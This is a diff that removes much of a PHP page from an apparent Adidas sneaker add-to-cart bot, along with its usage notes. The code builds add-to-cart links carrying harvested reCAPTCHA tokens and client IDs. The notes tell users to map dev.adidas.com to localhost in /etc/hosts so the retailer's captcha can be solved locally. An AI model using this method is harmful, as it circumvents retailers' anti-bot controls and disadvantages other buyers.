-                      <td><center><b><font color='green'><?php echo $stockCount[$variant[0]]; ?></font></b></center></td>
-                    <?php else: ?>
-                      <td><center><b><font color='red'><?php echo $stockCount[$variant[0]]; ?></font></b></center></td>
-                    <?php endif; ?>
-                  <?php else: ?>
-                    <td><center>?</center></td>
-                  <?php endif; ?>
-                  <?php if (!$clientStockException): ?>
-                    <?php if ($clientStockCount[$variant[0]] > 0): ?>
-                      <td><center><b><font color='green'><?php echo $clientStockCount[$variant[0]]; ?></font></b></center></td>
-                    <?php else: ?>
-                      <td><center><b><font color='red'><?php echo $clientStockCount[$variant[0]]; ?></font></b></center></td>
-                    <?php endif; ?>
-                  <?php else: ?>
-                    <td><center>?</center></td>
-                  <?php endif; ?>
-                  <td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<?php echo $sizeLookup[$variant[1]]; ?></td>
-                  <td align="center">
-                    <?php
-                      $payload="layer=Add+To+Bag+overlay&pid=".$variant[0]."&Quantit=1&masterPid=".$productMasterId."&ajax=true";
-                      if (strlen($gcaptcha) > 0)
-                      {
-                        $payload=$payload."&g-recaptcha-response=".$gcaptcha."&x-PrdRtt=".$gcaptcha;
-                      }
-                      $variantATCURL=$atcURL."?".$payload;
-                    ?>
-                    <a href="<?php echo $variantATCURL; ?>" target="_blank">
-                      <?php echo $variant[0]; ?>
-                    </a>
-                  </td>
-                  <td align="center">
-                    <?php
-                      $payload="layer=Add+To+Bag+overlay&pid=".$variant[0]."&Quantit=1&masterPid=".$productMasterId."&ajax=true";
-                      if (strlen($gcaptcha) > 0)
-                      {
-                        $payload="clientId=".$clientId."&".$payload."&g-recaptcha-response=".$gcaptcha."&x-PrdRtt=".$gcaptcha;
-                      }
-                      else
-                      {
-                        $payload="clientId=".$clientId."&".$payload;
-                      }
-                      $variantATCURL=$atcURL."?".$payload;
-                    ?>
-                    <a href="<?php echo $variantATCURL; ?>" target="_blank">
-                      <?php echo $variant[0]; ?>
-                    </a>
-                  </td>
-                  <form target="_blank" action="/d3stryr-3stripes-atc-cs.php" method="post">
-                    <td valign="middle" align="center">
-                      <input type="hidden" value="<?php echo $clientId; ?>" name="clientId" id="clientId"/>
-                      <input type="hidden" value="<?php echo $locale; ?>" name="locale" id="locale"/>
-                      <input type="hidden" value="<?php echo $gcaptcha; ?>" name="gcaptcha" id="gcaptcha"/>
-                      <input type="hidden" value="<?php echo $variant[0]; ?>" name="pid" id="pid"/>
-                      <input type="hidden" value="<?php echo $productMasterId; ?>" name="masterPid" id="masterPid"/>
-                      <input type="hidden" value="True" name="atcPostContinueShopping" id="atcPostContinueShopping"/>
-                      <button type="submit" value="<?php echo $variant[0]; ?>" name="submit" id="submit"><?php echo $variant[0]; ?></button>
-                    </td>
-                  </form>
-                </tr>
-              <?php endforeach; ?>
-              </table>
-            </h2>
-            <p><br>* indentifies if the particular size will be purchable on release</p>
-          <?php else: ?>
-          <!-- Something not working so we let the end user know -->
-          <h2><?php echo $exceptionType; ?></h2>
-          <h1><center>Chicken Butt<center></h1>
-          <?php endif; ?> <!-- Finish handling POST request -->
-
-        <?php else: ?> <!-- Load main php page options with values from cookies-->
-
-          <?php
-            //SKU is obtained from cookies
-            @$sku=$_COOKIE['d3stripesSku'];
-            //Client ID is obtained from cookies
-            @$clientId=$_COOKIE['d3stripesClientId'];
-            //Captcha site-key is obtained from cookies
-            @$sitekey=$_COOKIE['d3stripesSiteKey'];
-            //Locale is obtained from cookies
-            @$locale=$_COOKIE['d3stripesLocale'];
-          ?>
-          <?php if (!isset($sku)): ?>
-          <table width="100%">
-            <tr>
-              <td>
-                <fieldset>
-                  <h2><font color="red">Refresh your browser again in order for default cookies to stick.</font></h2>
-                </fieldset>
-              </td>
-            </tr>
-          </table>
-          <?php endif; ?>
-          <table width="100%">
-            <form action="/d3stryr-3stripes.php" method="post">
-              <tr>
-                <td>
-                  <fieldset>
-                    <h2>Locale: <?php echo $locale; ?><br>
-                      <input type="hidden" value="True" name="resetParameters" id="resetParameters"/>
-                      <input type="submit" value="Set/Change Parameters" name="submit" id="submit"/>
-                    </h2>
-                  </fieldset>
-                </td>
-              </tr>
-            </form>
-          </table>
-          <table width="100%">
-            <tr>
-              <td valign="top">
-                <form action="/d3stryr-3stripes.php" method="post">
-                  <fieldset>
-                    <h2>Captcha SITE-KEY<br>
-                      <input type="text" size="50" value="<?php echo $sitekey; ?>" name="gsk" id="gsk"/>
-                    </h2>
-                    <h2>Google  Captcha<br>
-                      <div class="g-recaptcha" data-sitekey="<?php echo $sitekey; ?>"></div>
-                      <script type="text/javascript" src="https://www.google.com/recaptcha/api.js"></script>
-                    </h2>
-                    <p>
-                      <input type="hidden" value="<?php echo $locale; ?>" name="locale" id="locale"/>
-                      <input type="submit" value="Transfer Google Captcha Token" name="submit" id="submit"/>
-                    </p>
-                  </fieldset>
-                </form>
-
-                <form action="/d3stryr-3stripes.php" method="post">
-                  <fieldset>
-                    <h2>SKU<br>
-                      <input type="text" value="<?php echo $sku; ?>" name="sku" id="sku"/>
-                    </h2>
-                    <h2>Client Id<br>
-                      <input name="clientId" id="clientId" size="50" value="<?php echo $clientId; ?>"></input>
-                    </h2>
-                    <h2>g-captcha Response<br>
-                    <?php
-                      if ( (isset($_POST['g-recaptcha-response'])) && (strlen($_POST['g-recaptcha-response'])>0) )
-                      {
-                        $gcaptcha=$_POST['g-recaptcha-response'];
-                      }
-                      else
-                      {
-                        $gcaptcha="";
-                      }
-                    ?>
-                      <textarea name="gcaptcha" id="gcaptcha" cols="50" rows="5"><?php echo $gcaptcha; ?></textarea>
-                    </h2>
-                    <input type="hidden" value="<?php echo $locale; ?>" name="locale" id="locale"/>
-                    <p><button type="submit" name="submit" id="submit">Submit</button></p>
-                  </fieldset>
-                </form>
-
-                <fieldset>
-                  <p>Instructions
-                  <br>1. (if needed) Set/Change parameters
-                  <br>2. (if needed) Solve Google Captcha then click Transfer Google Captcha Token
-                  <br>3. (required) Enter a valid SKU from Adidas
-                  <br>4. Click submit
-                  </p>
-                </fieldset>
-
-              </td>
-              <td width="50%">
-                <fieldset>
-                <a class="twitter-timeline" href="https://twitter.com/SOLEMARTYR">Tweets by TheNikeDestroyer</a> <script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
-                </fieldset>
-              </td>
-            </tr>
-          </table>
-        <?php endif; ?>
-      <?php endif; ?>  <!--IF RESET PARAMETERS -->
-  </body>
-</html>
+-->
 <!--
  The following attributions must remain in all original or modified versions of this code:
   @SoleMartyr / Twitter
@@ -1372,78 +5251,5 @@
   https://tldrlegal.com/license/gnu-general-public-license-v3-(gpl-3)
 -->
 <!--
-Usage (with local captcha support):
-
-Step-by-step instructions:
-
-A) Download d3stryr-3stripes.php        (http://bit.ly/d3stripes)
-B) Download d3stryr-3stripes-atc-cs.php (http://bit.ly/adcBDCS)
-
-1) Click "Download ZIP"
-2) If you are on a Mac this will save the zip to the Download folder.
-3) Unzip the file you just download.
-4) Open the folder you just unzipped.
-5) Move the d3stryr-3stripes.php and d3stryr-3stripes-atc-cs.php file to your home folder on your mac. The home folder is normally the folder with your username.
-6) Open up a terminal window.
-7) Type (or copy & paste) the following command below and then hit enter:
-
-php -v
-
-8) If the out of the command shows you a number larger than 5.4 after PHP then you are good to go. For the really dumb sneaker heads: 5.5 is larger than 5.4
-
-However, if you are running a version less than 5.4 (say 5.3) then I'm not sure if it will or will not work. But you can proceed and pray.
-
-9) Type (or copy & paste) the following command below into the terminal window and then hit enter:
-
-echo '127.0.0.1 dev.adidas.com' | sudo tee -a /etc/hosts > /dev/null && echo DONE
-
-10) It will prompt you for your password. Enter it in. It will not show you your password as you enter it in. But if you enter it in correctly then you should see:
-
-DONE
-
-11) Step #10 only has to be done once and never again if you enter your password in correctly.
-12)  Type (or copy & paste) the following command below into the terminal window and then hit enter:
-
-php -S 127.0.0.1:8000
-
-13) Now open a browser window and navigate to:
-
-http://dev.adidas.com:8000/d3stryr-3stripes.php
-
-14) When you are done. Just close the terminal window.
-15) If you want to run the script again just follow from steps 12.
--->
-
-
-<!--
-
-While you dont have to do this, for step #9 consider using a variation of dev.adidas.com in the command if you are from a different locale:
-
-Locale:
-  AT : dev.adidas.at
-  AU : dev.adidas.com.au
-  BE : dev.adidas.be
-  BR : dev.adidas.com.br
-  CA : dev.adidas.ca
-  CL : dev.adidas.cl
-  CO : dev.adidas.co
-  CZ : dev.adidas.cz
-  DE : dev.adidas.de
-  DK : dev.adidas.dk
-  ES : dev.adidas.es
-  FI : dev.adidas.fi
-  FR : dev.adidas.fr
-  IE : dev.adidas.ie
-  IT : dev.adidas.it
-  MX : dev.adidas.mx
-  NL : dev.adidas.nl
-  NZ : dev.adidas.co.nz
-  PL : dev.adidas.pl
-  RU : dev.adidas.ru
-  SE : dev.adidas.se
-  SK : dev.adidas.sk
-  GB : dev.adidas.co.uk
-
-You would then have to use the same local in step #13
-
+  This php file is to accompany d3stryr-3stripes-atc-cs.php
 -->
